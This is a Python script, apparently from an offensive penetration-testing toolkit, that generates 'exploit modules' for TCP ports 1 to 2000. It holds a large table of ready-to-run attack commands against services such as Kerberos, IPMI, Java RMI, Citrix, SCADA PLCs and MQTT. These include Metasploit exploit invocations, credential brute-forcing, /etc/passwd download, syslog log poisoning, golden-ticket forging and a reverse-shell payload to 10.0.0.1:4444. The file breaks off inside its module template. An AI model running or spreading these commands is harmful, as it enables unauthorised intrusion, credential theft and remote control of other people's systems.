#!/usr/bin/env python3
"""
Port Module Generator
=====================
Generates port_NNN_service.py exploit modules for all TCP ports 1-2000
that don't already have a custom module.

Run:  python3 generate_port_modules.py
"""

import os
import sys

MODULES_DIR = os.path.dirname(os.path.abspath(__file__))

# ── Already-covered ports (skip these) ───────────────────────────────────────
EXISTING = {
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161,
    389, 443, 445, 993, 995, 1433, 1521, 1723, 2049, 2323,
    3306, 3389, 5432, 5555, 5900, 5985, 6379, 6667,
    7547, 8080, 8443, 9200, 27017,
}

# ── Comprehensive port database: port → (service, description, mitre, exploits) ──
# exploits: list of (name, source, type, msf_module, description, exec_cmd, risk)
PORT_DB = {
    # ── Very low ports ──────────────────────────────────────────────────────
    1:   ("tcpmux",    "TCP Port Service Multiplexer", ["T1046"],
          [("TCP Port Multiplexer Probe", "metasploit", "auxiliary",
            "auxiliary/scanner/portscan/tcp",
            "Test TCP port multiplexer for misconfig",
            "nmap -sV -p 1 {target}", "Info")]),

    7:   ("echo",     "Echo Protocol", ["T1499"],
          [("Echo Amplification DoS", "custom", "auxiliary",
            "auxiliary/dos/tcp/synflood",
            "Send crafted packets to trigger echo amplification",
            "nmap --script echo -p 7 {target}", "Medium")]),

    9:   ("discard",  "Discard / Wake-on-LAN", ["T1046"],
          [("WakeOnLAN Probe", "custom", "auxiliary",
            "",
            "Craft WOL magic packet to wake target",
            "python3 -c \"import socket,struct; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(b'\\xff'*6+bytes.fromhex('FFFFFFFFFFFF')*16, ('{target}',9))\"",
            "Info")]),

    11:  ("systat",   "Active Users / SYSTAT", ["T1087"],
          [("SYSTAT User Enumeration", "custom", "auxiliary",
            "auxiliary/scanner/misc/systat",
            "Query SYSTAT for active user list",
            "nc -w2 {target} 11", "Low")]),

    13:  ("daytime",  "Daytime Protocol", ["T1046"],
          [("Daytime Protocol Fingerprint", "custom", "auxiliary",
            "",
            "Grab daytime response for timezone fingerprinting",
            "nc -w2 {target} 13", "Info")]),

    15:  ("netstat",  "NETSTAT Service", ["T1049"],
          [("NETSTAT Information Leak", "custom", "auxiliary",
            "",
            "Retrieve active connections from target (legacy)",
            "nc -w2 {target} 15", "Medium")]),

    17:  ("qotd",    "Quote of the Day", ["T1499"],
          [("QOTD Amplification", "custom", "auxiliary",
            "",
            "UDP amplification attack via QOTD",
            "nmap --script qotd {target}", "Medium")]),

    19:  ("chargen",  "Character Generator", ["T1499"],
          [("Chargen UDP Amplification", "custom", "auxiliary",
            "auxiliary/dos/udp/chargen",
            "Chargen amplification for DoS",
            "nmap --script chargen {target} -p 19", "High")]),

    20:  ("ftp-data", "FTP Data Transfer", ["T1048"],
          [("FTP Passive Data Intercept", "metasploit", "auxiliary",
            "auxiliary/scanner/ftp/ftp_version",
            "Intercept FTP passive data streams",
            "msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {target}; run; exit'",
            "Medium")]),

    37:  ("time",    "Time Protocol", ["T1046"],
          [("Time Protocol Fingerprint", "custom", "auxiliary",
            "",
            "Query time service for clock skew analysis (Kerberos attacks)",
            "nc -w2 {target} 37 | xxd", "Info")]),

    42:  ("nameserv", "WINS Replication", ["T1018"],
          [("WINS Name Resolution Poisoning", "metasploit", "auxiliary",
            "auxiliary/spoof/wins/wins_response_spoofer",
            "Spoof WINS responses to redirect traffic",
            "msfconsole -q -x 'use auxiliary/spoof/wins/wins_response_spoofer; set RHOSTS {target}; run; exit'",
            "High")]),

    43:  ("whois",   "WHOIS Query Service", ["T1590"],
          [("WHOIS Information Gathering", "custom", "auxiliary",
            "",
            "Query WHOIS for target organisation details",
            "whois -h {target} domain.com", "Info")]),

    49:  ("tacacs",  "TACACS Authentication", ["T1110"],
          [("TACACS+ Brute Force", "metasploit", "auxiliary",
            "auxiliary/scanner/tacacs/tacacs_login",
            "Brute force TACACS+ authentication",
            "msfconsole -q -x 'use auxiliary/scanner/tacacs/tacacs_login; set RHOSTS {target}; run; exit'",
            "High")]),

    67:  ("dhcp",    "DHCP Server", ["T1557"],
          [("DHCP Starvation / Rogue DHCP", "metasploit", "auxiliary",
            "auxiliary/server/dhcp",
            "Starve DHCP pool then offer rogue DHCP server to redirect traffic",
            "msfconsole -q -x 'use auxiliary/server/dhcp; set SRVHOST {target}; run; exit'",
            "Critical")]),

    69:  ("tftp",    "Trivial File Transfer Protocol", ["T1105", "T1083"],
          [("TFTP Enumeration & File Read", "metasploit", "auxiliary",
            "auxiliary/scanner/tftp/tftpbrute",
            "Brute-force TFTP filenames to download config files",
            "msfconsole -q -x 'use auxiliary/scanner/tftp/tftpbrute; set RHOSTS {target}; run; exit'",
            "High"),
           ("TFTP passwd/shadow Download", "custom", "exploit",
            "",
            "Attempt to download /etc/passwd or Cisco startup-config",
            "atftp --get --remote-file /etc/passwd --local-file /tmp/passwd {target}",
            "Critical")]),

    70:  ("gopher",  "Gopher Protocol", ["T1190"],
          [("Gopher SSRF Vector", "custom", "auxiliary",
            "",
            "Use Gopher URLs as SSRF payloads to attack internal services",
            "curl gopher://{target}:70/", "Medium")]),

    79:  ("finger",  "Finger User Lookup", ["T1087"],
          [("Finger User Enumeration", "metasploit", "auxiliary",
            "auxiliary/scanner/finger/finger_users",
            "Enumerate users via Finger protocol",
            "msfconsole -q -x 'use auxiliary/scanner/finger/finger_users; set RHOSTS {target}; run; exit'",
            "Medium"),
           ("Finger Bounce Attack", "custom", "auxiliary",
            "",
            "Use finger forwarding to pivot through hosts",
            "finger @{target}", "Low")]),

    81:  ("http-alt","HTTP Alternate Port", ["T1190"],
          [("HTTP Alt Port Vulnerability Scan", "metasploit", "auxiliary",
            "auxiliary/scanner/http/http_version",
            "Scan HTTP service on alternate port 81",
            "msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS {target}; set RPORT 81; run; exit'",
            "Medium"),
           ("Directory Traversal Port 81", "metasploit", "auxiliary",
            "auxiliary/scanner/http/http_traversal",
            "Test for path traversal on HTTP alt port",
            "msfconsole -q -x 'use auxiliary/scanner/http/http_traversal; set RHOSTS {target}; set RPORT 81; run; exit'",
            "Medium")]),

    82:  ("http-alt2","HTTP Alternate Port 82", ["T1190"],
          [("HTTP Alt Port 82 Scan", "metasploit", "auxiliary",
            "auxiliary/scanner/http/http_version",
            "Enumerate web application on port 82",
            "msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS {target}; set RPORT 82; run; exit'",
            "Medium")]),

    83:  ("mit-ml",  "MIT ML Device", ["T1046"],
          [("Port 83 Service Probe", "custom", "auxiliary", "",
            "Probe unknown MIT ML device service",
            "nmap -sV -p 83 {target}", "Info")]),

    88:  ("kerberos","Kerberos Authentication", ["T1558", "T1550.003", "T1187"],
          [("Kerberoasting AS-REP Roasting", "metasploit", "auxiliary",
            "auxiliary/gather/get_user_spns",
            "Request service tickets for offline cracking (Kerberoasting)",
            "python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip {target} domain/user",
            "Critical"),
           ("MS14-068 Kerberos Privilege Escalation", "metasploit", "exploit",
            "exploit/windows/kerberos/ms14_068_kerberoast",
            "Forge PAC certificate to gain Domain Admin",
            "msfconsole -q -x 'use exploit/windows/kerberos/ms14_068_kerberoast; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("Kerberos Golden Ticket", "custom", "exploit",
            "",
            "Create golden ticket for persistent domain admin access",
            "python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash HASH -domain-sid DOMSID -domain domain.local administrator",
            "Critical"),
           ("AS-REP Roasting (No Pre-Auth)", "custom", "auxiliary",
            "",
            "Find accounts without Kerberos pre-auth for offline cracking",
            "python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain/ -usersfile users.txt -dc-ip {target}",
            "High")]),

    102: ("ibm-mq",  "IBM MQ / S7comm (Siemens)", ["T1057"],
          [("S7comm Siemens PLC Enumeration", "metasploit", "auxiliary",
            "auxiliary/scanner/scada/siemens_s7_basic",
            "Enumerate Siemens S7 PLCs (SCADA)",
            "msfconsole -q -x 'use auxiliary/scanner/scada/siemens_s7_basic; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("IBM MQ Config Probe", "custom", "auxiliary", "",
            "Probe IBM MQ message queue service",
            "nmap --script ibm-db2-info -p 102 {target}", "Medium")]),

    113: ("ident",   "Ident / Auth Service", ["T1087"],
          [("Ident User Enumeration", "metasploit", "auxiliary",
            "auxiliary/scanner/ident/ident_user_enum",
            "Query ident service to map ports to users",
            "msfconsole -q -x 'use auxiliary/scanner/ident/ident_user_enum; set RHOSTS {target}; run; exit'",
            "Medium")]),

    119: ("nntp",    "Network News Transfer Protocol", ["T1190"],
          [("NNTP Anonymous Access", "metasploit", "auxiliary",
            "auxiliary/scanner/nntp/nntp_login",
            "Brute force NNTP credentials or check anonymous access",
            "msfconsole -q -x 'use auxiliary/scanner/nntp/nntp_login; set RHOSTS {target}; run; exit'",
            "Medium")]),

    123: ("ntp",     "Network Time Protocol", ["T1499", "T1557"],
          [("NTP Amplification DDoS", "metasploit", "auxiliary",
            "auxiliary/dos/ntp/ntpd_monlist",
            "Trigger monlist response for DDoS amplification",
            "msfconsole -q -x 'use auxiliary/dos/ntp/ntpd_monlist; set RHOSTS {target}; run; exit'",
            "High"),
           ("NTP Peer List Enumeration", "metasploit", "auxiliary",
            "auxiliary/scanner/ntp/ntp_peer_list",
            "Enumerate NTP peers for network topology",
            "msfconsole -q -x 'use auxiliary/scanner/ntp/ntp_peer_list; set RHOSTS {target}; run; exit'",
            "Medium")]),

    137: ("netbios-ns","NetBIOS Name Service", ["T1018", "T1135"],
          [("NetBIOS Name Enumeration", "metasploit", "auxiliary",
            "auxiliary/scanner/netbios/nbname",
            "Enumerate NetBIOS names and MAC addresses",
            "msfconsole -q -x 'use auxiliary/scanner/netbios/nbname; set RHOSTS {target}; run; exit'",
            "Medium"),
           ("NetBIOS Name Spoofing", "metasploit", "auxiliary",
            "auxiliary/spoof/nbns/nbns_response",
            "Spoof NBNS responses to capture NTLM hashes",
            "msfconsole -q -x 'use auxiliary/spoof/nbns/nbns_response; set SRVHOST {target}; run; exit'",
            "High")]),

    138: ("netbios-dgm","NetBIOS Datagram Service", ["T1018"],
          [("NetBIOS Datagram Enum", "metasploit", "auxiliary",
            "auxiliary/scanner/netbios/nbname",
            "Enumerate workgroups via NetBIOS datagram",
            "nmblookup -A {target}", "Low")]),

    177: ("xdmcp",   "X Display Manager Control Protocol", ["T1021"],
          [("XDMCP Remote Desktop Hijack", "metasploit", "auxiliary",
            "auxiliary/scanner/x11/open_x11",
            "Connect to open XDMCP/X11 display for remote desktop",
            "msfconsole -q -x 'use auxiliary/scanner/x11/open_x11; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("X11 Screenshot Capture", "metasploit", "auxiliary",
            "auxiliary/scanner/x11/open_x11",
            "Capture screenshot from an unauthenticated X11 display",
            "DISPLAY={target}:0 xwd -root -out /tmp/screen.xwd",
            "High")]),

    179: ("bgp",     "Border Gateway Protocol", ["T1557", "T1498"],
          [("BGP Route Injection", "custom", "exploit", "",
            "Inject malicious BGP routes to hijack traffic (requires BGP session)",
            "msfconsole -q -x 'use auxiliary/scanner/bgp/bgp_open; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("BGP Open Message Scan", "metasploit", "auxiliary",
            "auxiliary/scanner/bgp/bgp_open",
            "Check for unauthenticated BGP sessions",
            "msfconsole -q -x 'use auxiliary/scanner/bgp/bgp_open; set RHOSTS {target}; run; exit'",
            "High")]),

    194: ("irc",     "Internet Relay Chat", ["T1219", "T1071.003"],
          [("IRC Nick/Channel Enumeration", "metasploit", "auxiliary",
            "auxiliary/scanner/irc/irc_users",
            "List IRC users and channels",
            "msfconsole -q -x 'use auxiliary/scanner/irc/irc_users; set RHOSTS {target}; run; exit'",
            "Low"),
           ("UnrealIRCd Backdoor RCE", "metasploit", "exploit",
            "exploit/unix/irc/unreal_ircd_3281_backdoor",
            "Exploit UnrealIRCd 3.2.8.1 backdoor for remote code execution",
            "msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {target}; set LHOST eth0; run; exit'",
            "Critical")]),

    500: ("isakmp",  "IKE/IPSec ISAKMP", ["T1572"],
          [("IKE Aggressive Mode PSK Crack", "metasploit", "auxiliary",
            "auxiliary/scanner/ike/cisco_ike_benign",
            "Capture IKE aggressive mode handshake for PSK cracking",
            "msfconsole -q -x 'use auxiliary/scanner/ike/cisco_ike_benign; set RHOSTS {target}; run; exit'",
            "High"),
           ("IKEscan VPN Fingerprinting", "custom", "auxiliary", "",
            "Fingerprint VPN gateway via IKE scanning",
            "ike-scan {target}", "Medium")]),

    512: ("exec",    "rexec Remote Execution", ["T1021"],
          [("rexec Remote Command Execution", "metasploit", "exploit",
            "exploit/unix/misc/rexec_login",
            "Execute commands remotely via rexec (no encryption)",
            "msfconsole -q -x 'use exploit/unix/misc/rexec_login; set RHOSTS {target}; run; exit'",
            "Critical")]),

    513: ("rlogin",  "Berkeley rlogin", ["T1021"],
          [("rlogin Trust Relationship Exploit", "metasploit", "exploit",
            "exploit/unix/misc/rlogin",
            "Exploit .rhosts trust relationships for unauthenticated login",
            "msfconsole -q -x 'use exploit/unix/misc/rlogin; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("rlogin Credential Brute", "custom", "auxiliary", "",
            "Brute-force rlogin credentials via legacy service",
            "rlogin -l root {target}", "High")]),

    514: ("rsh",     "Remote Shell / Syslog", ["T1021", "T1565.003"],
          [("RSH Trust Exploit (.rhosts)", "metasploit", "exploit",
            "exploit/unix/misc/rsh",
            "Execute commands via .rhosts trusted host relationship",
            "msfconsole -q -x 'use exploit/unix/misc/rsh; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("Syslog UDP Injection", "custom", "exploit", "",
            "Inject forged syslog events to pollute logs (log poisoning)",
            "python3 -c \"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(b'<14>Mar 18 11:00:00 {target} sudo: root: COMMAND=/bin/bash; s.close()\"",
            "Medium")]),

    515: ("printer", "LPD Line Printer Daemon", ["T1048", "T1499"],
          [("LPD Printer Data Access", "metasploit", "auxiliary",
            "auxiliary/scanner/printer/printer_env_vars",
            "Retrieve printer environment variables and spool access",
            "msfconsole -q -x 'use auxiliary/scanner/printer/printer_env_vars; set RHOSTS {target}; run; exit'",
            "Medium"),
           ("LPD Buffer Overflow", "metasploit", "exploit",
            "exploit/unix/printer/lpd_exit_shell",
            "Exploit LPD buffer overflow for remote shell",
            "msfconsole -q -x 'use exploit/unix/printer/lpd_exit_shell; set RHOSTS {target}; run; exit'",
            "Critical")]),

    520: ("rip",     "Routing Information Protocol", ["T1557"],
          [("RIP Route Injection", "metasploit", "auxiliary",
            "auxiliary/scanner/misc/ib_impersonation",
            "Inject fake RIP routes to redirect network traffic",
            "python3 -c \"import socket; # send RIP update to {target}\"",
            "Critical")]),

    554: ("rtsp",    "Real Time Streaming Protocol", ["T1040"],
          [("RTSP Credential Brute Force", "metasploit", "auxiliary",
            "auxiliary/scanner/rtsp/rtsp_auth_bypass",
            "Brute force RTSP camera credentials",
            "msfconsole -q -x 'use auxiliary/scanner/rtsp/rtsp_auth_bypass; set RHOSTS {target}; run; exit'",
            "High"),
           ("RTSP Stream Sniffing", "custom", "auxiliary", "",
            "Capture unauthenticated RTSP video stream",
            "ffplay rtsp://{target}:554/live.sdp", "High")]),

    587: ("submission","SMTP Submission", ["T1566", "T1078"],
          [("SMTP Auth Brute Force (Port 587)", "metasploit", "auxiliary",
            "auxiliary/scanner/smtp/smtp_login",
            "Brute force SMTP AUTH credentials on submission port",
            "msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_login; set RHOSTS {target}; set RPORT 587; run; exit'",
            "High"),
           ("SMTP Open Relay Test Port 587", "metasploit", "auxiliary",
            "auxiliary/scanner/smtp/smtp_relay",
            "Test for open SMTP relay on submission port",
            "msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {target}; set RPORT 587; run; exit'",
            "Medium")]),

    623: ("ipmi",    "IPMI / BMC Remote Management", ["T1078"],
          [("IPMI 2.0 RAKP Authentication Bypass", "metasploit", "auxiliary",
            "auxiliary/scanner/ipmi/ipmi_dumphashes",
            "Dump IPMI password hashes for offline cracking (CVE-2013-4786)",
            "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("IPMI Cipher Zero Auth Bypass", "metasploit", "auxiliary",
            "auxiliary/scanner/ipmi/ipmi_cipher_zero",
            "Exploit IPMI cipher 0 to bypass authentication",
            "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("IPMI Default Credentials", "metasploit", "auxiliary",
            "auxiliary/scanner/ipmi/ipmi_login",
            "Test IPMI default credentials (admin/admin, ADMIN/ADMIN)",
            "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_login; set RHOSTS {target}; run; exit'",
            "High")]),

    631: ("ipp",     "CUPS / Internet Printing Protocol", ["T1210"],
          [("CUPS Enumeration & Info Leak", "metasploit", "auxiliary",
            "auxiliary/scanner/printer/printer_env_vars",
            "Enumerate CUPS printers and configurations",
            "msfconsole -q -x 'use auxiliary/scanner/printer/printer_env_vars; set RHOSTS {target}; set RPORT 631; run; exit'",
            "Medium"),
           ("CUPS CVE-2024-47076 RCE", "custom", "exploit", "",
            "Exploit CUPS vulnerability for unauthenticated RCE (2024)",
            "python3 /opt/cups_exploit.py {target} 631",
            "Critical")]),

    636: ("ldaps",   "LDAP over SSL", ["T1087.002", "T1069.002"],
          [("LDAPS Anonymous Bind Enum", "metasploit", "auxiliary",
            "auxiliary/gather/ldap_hashdump",
            "Anonymous LDAP bind over SSL for AD enumeration",
            "msfconsole -q -x 'use auxiliary/gather/ldap_hashdump; set RHOSTS {target}; set RPORT 636; set SSL true; run; exit'",
            "High"),
           ("BloodHound AD Enumeration via LDAPS", "custom", "auxiliary", "",
            "Run BloodHound collection against LDAPS endpoint",
            "bloodhound-python -u user -p pass -d domain.local -dc {target} -c All",
            "High")]),

    666: ("doom",    "Doom / Custom Service", ["T1046"],
          [("Port 666 Service Probe", "custom", "auxiliary", "",
            "Probe unknown service on port 666",
            "nmap -sV -p 666 {target}", "Info")]),

    749: ("kerberos-adm","Kerberos Administration", ["T1558"],
          [("Kerberos Admin Service Enum", "custom", "auxiliary", "",
            "Probe Kerberos administration service",
            "kadmin -r REALM -s {target}", "High")]),

    873: ("rsync",   "rsync Remote Sync", ["T1048", "T1083"],
          [("rsync Unauthenticated Module List", "metasploit", "auxiliary",
            "auxiliary/scanner/rsync/modules_list",
            "List rsync modules accessible without authentication",
            "msfconsole -q -x 'use auxiliary/scanner/rsync/modules_list; set RHOSTS {target}; run; exit'",
            "High"),
           ("rsync File Download", "custom", "exploit", "",
            "Download files from unauthenticated rsync share",
            "rsync -av rsync://{target}/ /tmp/loot/",
            "Critical")]),

    902: ("vmware",  "VMware Remote Console (VMRC)", ["T1210"],
          [("VMware vSphere/ESXi Auth Bypass", "metasploit", "auxiliary",
            "auxiliary/scanner/vmware/vmware_hostd_login",
            "Brute force VMware hostd authentication",
            "msfconsole -q -x 'use auxiliary/scanner/vmware/vmware_hostd_login; set RHOSTS {target}; run; exit'",
            "Critical"),
           ("VMware VMRC Escape", "custom", "exploit", "",
            "Probe VMware Remote Console for VM escape vulnerabilities",
            "nmap --script vmware-version -p 902 {target}",
            "High")]),

    989: ("ftps-data","FTPS Data", ["T1048"],
          [("FTPS Data Intercept", "custom", "auxiliary", "",
            "Intercept FTPS data channel (requires cert bypass)",
            "nmap --script ftp-anon,ftp-bounce -p 989 {target}", "Medium")]),

    990: ("ftps",    "FTP over SSL", ["T1048"],
          [("FTPS Anonymous Login", "metasploit", "auxiliary",
            "auxiliary/scanner/ftp/ftp_login",
            "Test FTPS for anonymous access and credential brute force",
            "msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_login; set RHOSTS {target}; set RPORT 990; run; exit'",
            "High")]),

    992: ("telnet-ssl","Telnet over SSL", ["T1021"],
          [("Telnet SSL Credential Brute", "metasploit", "auxiliary",
            "auxiliary/scanner/telnet/telnet_login",
            "Brute force credentials on Telnet SSL service",
            "msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_login; set RHOSTS {target}; set RPORT 992; run; exit'",
            "High")]),

    994: ("irc-ssl", "IRC over SSL", ["T1071.003"],
          [("IRC SSL Enumeration", "custom", "auxiliary", "",
            "Enumerate IRC channels over SSL",
            "openssl s_client -connect {target}:994",
            "Low")]),

    1080: ("socks",  "SOCKS Proxy", ["T1090", "T1572"],
           [("SOCKS4/5 Proxy Open Access", "metasploit", "auxiliary",
             "auxiliary/scanner/socks5/socks5_auth_bypass",
             "Test for unauthenticated SOCKS proxy for traffic pivoting",
             "msfconsole -q -x 'use auxiliary/scanner/socks5/socks5_auth_bypass; set RHOSTS {target}; run; exit'",
             "Critical"),
            ("SOCKS Proxy Credential Brute", "metasploit", "auxiliary",
             "auxiliary/scanner/socks5/socks5_login",
             "Brute force SOCKS5 proxy credentials",
             "msfconsole -q -x 'use auxiliary/scanner/socks5/socks5_login; set RHOSTS {target}; run; exit'",
             "High")]),

    1099: ("java-rmi","Java RMI Registry", ["T1210"],
           [("Java RMI Deserialization RCE", "metasploit", "exploit",
             "exploit/multi/misc/java_rmi_server",
             "Exploit Java RMI for deserialization remote code execution",
             "msfconsole -q -x 'use exploit/multi/misc/java_rmi_server; set RHOSTS {target}; set LHOST eth0; run; exit'",
             "Critical"),
            ("Java RMI Registry Enum", "metasploit", "auxiliary",
             "auxiliary/gather/java_rmi_registry",
             "Enumerate Java RMI registry for exposed objects",
             "msfconsole -q -x 'use auxiliary/gather/java_rmi_registry; set RHOSTS {target}; run; exit'",
             "High")]),

    1194: ("openvpn","OpenVPN", ["T1572"],
           [("OpenVPN Brute Force", "metasploit", "auxiliary",
             "auxiliary/scanner/openvpn/openvpn_login",
             "Brute force OpenVPN credentials",
             "msfconsole -q -x 'use auxiliary/scanner/openvpn/openvpn_login; set RHOSTS {target}; run; exit'",
             "High"),
            ("OpenVPN Config Probe", "custom", "auxiliary", "",
             "Fingerprint OpenVPN version and config",
             "nmap --script openvpn-info -p 1194 {target}", "Medium")]),

    1234: ("vlc",    "VLC Media Player HTTP Interface", ["T1190"],
           [("VLC HTTP Interface Auth Bypass", "custom", "exploit", "",
             "Access VLC HTTP API without authentication",
             "curl http://{target}:1234/requests/status.json",
             "High")]),

    1311: ("dell-om","Dell OpenManage HTTPS", ["T1078"],
           [("Dell OpenManage Default Creds", "metasploit", "auxiliary",
             "auxiliary/scanner/http/dell_idrac_enum",
             "Test Dell OpenManage for default credentials",
             "msfconsole -q -x 'use auxiliary/scanner/http/dell_idrac_enum; set RHOSTS {target}; set RPORT 1311; run; exit'",
             "Critical")]),

    1352: ("lotus",  "Lotus Notes / Domino", ["T1190", "T1552"],
           [("Lotus Domino User Enumeration", "metasploit", "auxiliary",
             "auxiliary/scanner/notes/notes_enum_databases",
             "Enumerate Lotus Domino databases and user accounts",
             "msfconsole -q -x 'use auxiliary/scanner/notes/notes_enum_databases; set RHOSTS {target}; run; exit'",
             "High"),
            ("Lotus Domino Hash Dump", "metasploit", "auxiliary",
             "auxiliary/scanner/notes/notes_enum_databases",
             "Retrieve hashed Domino passwords from directory",
             "msfconsole -q -x 'use auxiliary/gather/lotus_domino_hashes; set RHOSTS {target}; run; exit'",
             "Critical")]),

    1433: ("mssql-browser","MSSQL Browser / UDP", ["T1046"],
           [("MSSQL Browser Instance Enum", "metasploit", "auxiliary",
             "auxiliary/scanner/mssql/mssql_ping",
             "Discover MSSQL instances via SQL Server Browser",
             "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {target}; run; exit'",
             "Medium")]),

    1494: ("citrix", "Citrix ICA / XenApp", ["T1021", "T1078"],
           [("Citrix ICA Exploit (CVE-2019-19781)", "metasploit", "exploit",
             "exploit/linux/http/citrix_dir_traversal_rce",
             "Path traversal + RCE on Citrix ADC (CVE-2019-19781 Shitrix)",
             "msfconsole -q -x 'use exploit/linux/http/citrix_dir_traversal_rce; set RHOSTS {target}; run; exit'",
             "Critical"),
            ("Citrix Credential Brute", "metasploit", "auxiliary",
             "auxiliary/scanner/http/citrix_web_interface_login",
             "Brute force Citrix web interface credentials",
             "msfconsole -q -x 'use auxiliary/scanner/http/citrix_web_interface_login; set RHOSTS {target}; set RPORT 1494; run; exit'",
             "High")]),

    1512: ("wins",   "Windows Internet Name Service", ["T1018"],
           [("WINS Query & Poisoning", "metasploit", "auxiliary",
             "auxiliary/spoof/wins/wins_response_spoofer",
             "Query WINS for host names and poison responses",
             "msfconsole -q -x 'use auxiliary/spoof/wins/wins_response_spoofer; set RHOSTS {target}; run; exit'",
             "High")]),

    1527: ("apache-derby","Apache Derby DB", ["T1190"],
           [("Apache Derby Unauthenticated Access", "custom", "auxiliary", "",
             "Access Apache Derby database without credentials",
             "nmap --script=derby-db -p 1527 {target}", "High")]),

    1604: ("citrix-ica","Citrix ICA Alt", ["T1021"],
           [("Citrix ICA Alt Probe", "metasploit", "auxiliary",
             "auxiliary/scanner/http/citrix_web_interface_login",
             "Test Citrix alternate ICA port",
             "msfconsole -q -x 'use auxiliary/scanner/http/citrix_web_interface_login; set RHOSTS {target}; set RPORT 1604; run; exit'",
             "High")]),

    1812: ("radius",  "RADIUS Authentication", ["T1110", "T1078"],
           [("RADIUS Credential Brute Force", "metasploit", "auxiliary",
             "auxiliary/scanner/radius/radius_login",
             "Brute force RADIUS authentication server",
             "msfconsole -q -x 'use auxiliary/scanner/radius/radius_login; set RHOSTS {target}; run; exit'",
             "High"),
            ("RADIUS Shared Secret Brute", "metasploit", "auxiliary",
             "auxiliary/scanner/radius/radius_login",
             "Crack RADIUS shared secret via offline dictionary attack",
             "msfconsole -q -x 'use auxiliary/scanner/radius/radius_login; set RHOSTS {target}; set DICT /usr/share/wordlists/rockyou.txt; run; exit'",
             "Critical")]),

    1813: ("radius-acct","RADIUS Accounting", ["T1046"],
           [("RADIUS Accounting Probe", "custom", "auxiliary", "",
             "Probe RADIUS accounting port for information disclosure",
             "nmap -sU -p 1813 {target}", "Info")]),

    1883: ("mqtt",   "MQTT Broker (IoT)", ["T1040", "T1565"],
           [("MQTT Unauthenticated Subscribe", "metasploit", "auxiliary",
             "auxiliary/scanner/mqtt/mqtt_connect",
             "Subscribe to all MQTT topics without authentication",
             "msfconsole -q -x 'use auxiliary/scanner/mqtt/mqtt_connect; set RHOSTS {target}; run; exit'",
             "Critical"),
            ("MQTT Command Injection via Topic", "custom", "exploit", "",
             "Publish malicious MQTT message to control IoT device",
             "mosquitto_pub -h {target} -t 'device/cmd' -m 'EXEC: /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
             "Critical")]),

    1900: ("upnp",   "UPnP / SSDP", ["T1557", "T1498"],
           [("UPnP SSDP Amplification & Enum", "metasploit", "auxiliary",
             "auxiliary/scanner/upnp/ssdp_msearch",
             "Discover UPnP devices and exploit port mapping",
             "msfconsole -q -x 'use auxiliary/scanner/upnp/ssdp_msearch; set RHOSTS {target}; run; exit'",
             "High"),
            ("UPnP IGD Port Forwarding Abuse", "custom", "exploit", "",
             "Add malicious port forwarding rules via UPnP IGD",
             "python3 /opt/miranda_upnp.py -i {target}", "Critical")]),

    1935: ("rtmp",   "RTMP Media Streaming", ["T1040"],
           [("RTMP Stream Key Hijack", "custom", "auxiliary", "",
             "Capture or inject into RTMP live stream",
             "ffmpeg -re -i input.mp4 -f flv rtmp://{target}:1935/live/stream",
             "High"),
            ("RTMP Server Fingerprint", "custom", "auxiliary", "",
             "Fingerprint RTMP streaming server version",
             "nmap --script rtmp-info -p 1935 {target}", "Info")]),

    1985: ("hsrp",   "Cisco HSRP", ["T1557"],
           [("HSRP Active Router Takeover", "metasploit", "auxiliary",
             "auxiliary/scanner/misc/ib_impersonation",
             "Become HSRP active router to intercept traffic",
             "python3 /opt/hsrp_takeover.py {target}", "Critical")]),

    2000: ("sccp",   "Cisco SCCP / Skinny", ["T1562"],
           [("Cisco SCCP Phone Enumeration", "metasploit", "auxiliary",
             "auxiliary/scanner/sccp/enumerate_phones",
             "Enumerate Cisco IP phones via SCCP protocol",
             "msfconsole -q -x 'use auxiliary/scanner/sccp/enumerate_phones; set RHOSTS {target}; run; exit'",
             "Medium")]),
}

# ── Generic fallback template for ports not in PORT_DB ───────────────────────
SERVICES_BY_RANGE = [
    (1,    19,   "low-port",    "Low-numbered TCP service probe"),
    (20,   79,   "standard",    "Standard TCP network service"),
    (80,   110,  "web",         "Web-adjacent service"),
    (111,  200,  "rpc",         "RPC / network service"),
    (201,  399,  "application", "Application protocol service"),
    (400,  599,  "app-alt",     "Application alternate port"),
    (600,  799,  "system",      "System service port"),
    (800,  999,  "app-high",    "High-range application service"),
    (1000, 1099, "application", "High-range application service"),
    (1100, 1199, "app-custom",  "Custom application port"),
    (1200, 1299, "app-custom2", "Custom application port"),
    (1300, 1399, "app-custom3", "Custom application port"),
    (1400, 1599, "app-custom4", "Custom application port"),
    (1600, 1799, "app-custom5", "Custom application port"),
    (1800, 1899, "app-custom6", "Custom application port"),
    (1900, 2000, "app-custom7", "High-range custom service"),
]


def get_range_service(port):
    for lo, hi, svc, desc in SERVICES_BY_RANGE:
        if lo <= port <= hi:
            return svc, desc
    return "unknown", "Unknown TCP service"


MODULE_TEMPLATE = '''"""
{service_upper} Exploit Module — Port {port}
{description}
